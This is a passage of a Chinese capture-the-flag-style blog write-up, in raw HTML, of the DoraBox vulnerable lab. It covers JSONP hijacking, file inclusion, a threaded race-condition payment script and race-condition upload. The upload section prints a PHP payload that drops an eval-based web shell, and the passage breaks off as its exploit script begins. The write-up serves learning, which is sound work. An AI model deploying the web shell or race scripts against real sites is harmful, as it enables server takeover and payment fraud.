class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;JSONP劫持测试&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;result&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;        &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;            alert(result.address);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://localhost/dorabox/csrf/jsonp.php?callback=test&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_csrf_json002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-16&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;JSONP (JSON With Padding)，是一种特殊的 CSRF 攻击，目的是获取敏感数据，当 JSON 数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将 JSON 数据发送给第三方即攻击者的代码。&lt;/p&gt;
&lt;p&gt;没写过，第一次写，写完跨域好像又多懂了一点点（好像真的懂了，但是入职培训里写的有点详细），我写完这些要再多写几道题，来一点画面感。&lt;/p&gt;
&lt;h1 id=&#34;任意文件包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件包含&#34;&gt;#&lt;/a&gt; 任意文件包含&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_filein002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-17&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;直接文件包含，输出&lt;img src=&#34;dorabox_filein003.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-17&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;网上看了很多通关记录，可是大家都是直接包含，如果不是本地靶场，那是怎么知道路径以及文件名的呢？是不是要配合文件上传一起？&lt;/p&gt;
&lt;h1 id=&#34;任意文件包含-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件包含-2&#34;&gt;#&lt;/a&gt; 任意文件包含&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_filein002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-18&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;输入 1，发现限制在当前目录，但是不影响要用的文件，所以也是直接包含就可以了&lt;img src=&#34;dorabox_filein004.png&#34; alt=&#34;&#34;&gt;&lt;img src=&#34;dorabox_filein003.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-18&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;…/ 应该可以突破把&lt;/p&gt;
&lt;h1 id=&#34;条件竞争-支付&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#条件竞争-支付&#34;&gt;#&lt;/a&gt; 条件竞争 - 支付&lt;/h1&gt;
&lt;p&gt;靶场出了点问题，页面报 php 语法错&lt;/p&gt;
&lt;p&gt;但是语法并没有出错，百度了说是 php 版本的问题，但是我基本每个版本都试过且重启了，但是没有解决&lt;/p&gt;
&lt;p&gt;不过反正这个题要写脚本，我也不太会，干脆跟着把 poc 撸了一遍&lt;/p&gt;
&lt;h2 id=&#34;过程-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-19&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; threading&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; queue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    三个变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    url：要测试的网站地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    threads：线程数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    q：调用queue构造方法，对列队大小不设限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://localhost/dorabox/race_condition/pay.php&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;threads=&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q=queue.Queue()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 在列队中加入50个元素,0-49&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    q.put(i)   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 定义post函数，发50个一块钱&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;post&lt;/span&gt;():&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 当q里面还有元素时,就获取元素，发送一个post请求支付一块钱&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; q.empty():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        q.get() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# Requests以form表单形式发送post请求，支付输入框name是money嘛&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# data = &amp;#123;&amp;#x27;key1&amp;#x27;:&amp;#x27;value1&amp;#x27;,...&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r = requests.post(url, data = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;money&amp;#x27;&lt;/span&gt; : &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.encoding = &lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;一个python文件通常有两种使用方法,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 第一是作为脚本直接执行，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 第二是 import 到其他的 python 脚本中被调用（模块重用）执行。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 因此if __name__ == &amp;#x27;main&amp;#x27;: 的作用就是:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 控制这两种情况执行代码的过程，在if __name__ == &amp;#x27;main&amp;#x27;: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 每个python模块（python文件）都包含内置的变量 __name__，当该模块被直接执行的时候，__name__ 等于文件名（包含后缀 .py ）；如果该模块 import 到其他模块中，则该模块的 __name__ 等于模块名称（不包含后缀.py）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 而“__main__” 始终指当前执行模块的名称（包含后缀.py）。进而当模块被直接执行时，__name__ == &amp;#x27;__main__&amp;#x27; 结果为真。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 那其实就是主函数呗，程序运行入口，不过也有点区别嗷&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__==&lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 用25个线程，分别发50个一块钱&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(threads)：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t = threading.Thread(target=post) &lt;span class=&#34;comment&#34;&gt;# 目标对象是post函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.start() &lt;span class=&#34;comment&#34;&gt;# 开始执行线程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;总结-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-19&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;python 代码写的时候，总是爱打分号唉&lt;br&gt;
感觉大家写脚本或者一些小工具，都喜欢用 python，有点意思&lt;/p&gt;
&lt;p&gt;这里是看代码的时候找资料看见的（后来才发现 python 自带.chw api，不过英文的阅读起来也有点费时间就是了）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Queue 是 python 标准库中的线程安全的列队 (FIFO) 实现&lt;br&gt;
提供了一个适用于多线程编程的先进先出的数据结构，即列队&lt;br&gt;
用来在生产者和消费者线程之间的信息传递&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;class Queue.Queue(maxsize=0)&lt;br&gt;
 maxsize 是个整数，指明了列队中能存放的个数上限。&lt;br&gt;
一旦达到上限，插入会导致阻塞，直到列队中的数据被消费掉。&lt;br&gt;
如果 maxsize 小于或者等于 0，列队大小没有限制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Queue,deque,queue 对比：queue 是多线程中的使用的栈，但是 Python 解释器有一个全局解释器锁 (PIL)，&lt;br&gt;
导致每个 Python 进程中最多同时运行一个线程，&lt;br&gt;
因此 Python 多线程程序并不能改善程序性能，不能发挥多核系统的优势。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;multiprocessing.Queue 是 Python 2.6 引入的用来实现多进程的一种高性能栈。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;collections.deque 是为了高效实现插入和删除操作的双向列表，适合用于队列和栈。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;queue 实例方法：&lt;br&gt;
Queue.empty (): 判断队列是否为空。和上面一样注意&lt;br&gt;
 Queue.full (): 判断是否满了。和上面一样注意&lt;br&gt;
 Queue.put (item, block=True, timeout=None): 往队列里放数据。如果满了的话，blocking = False 直接报 Full 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能存入，报 Full 异常。&lt;br&gt;
Queue.put_nowait (item): 往队列里存放元素，不等待&lt;br&gt;
 Queue.get (item, block=True, timeout=None): 从队列里取数据。如果为空的话，blocking = False 直接报 empty 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能读取，报 empty 异常&lt;br&gt;
 Queue.get_nowait (item): 从队列里取元素，不等待两个方法跟踪入队的任务是否被消费者 daemon 进程完全消费&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;条件竞争-上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#条件竞争-上传&#34;&gt;#&lt;/a&gt; 条件竞争 - 上传&lt;/h1&gt;
&lt;p&gt;看源码顺序：文件上传上来，检查后缀，后缀不在允许列表里，删除文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_jz_upload001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-20&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;p&gt;竞争的地方，是先删除还是先执行，关键就在于赶在删除之前执行上传的文件。&lt;br&gt;
这是我们上传的文件内容，新建一个 info.php 文件，里面写入一句话木马。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption&gt;&lt;span&gt;payload&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; fputs(fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;info.php&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;), &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php @eval($_POST[&amp;quot;key&amp;quot;]);?&amp;gt;&amp;#x27;&lt;/span&gt;); &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过并发可以实现在上传成功未执行到删除代码的时候，访问执行，生成 info.php。&lt;/p&gt;
&lt;p&gt;脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; threading&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 父类 threading.Thread&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;RaceCondition&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;threading.Thread&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; 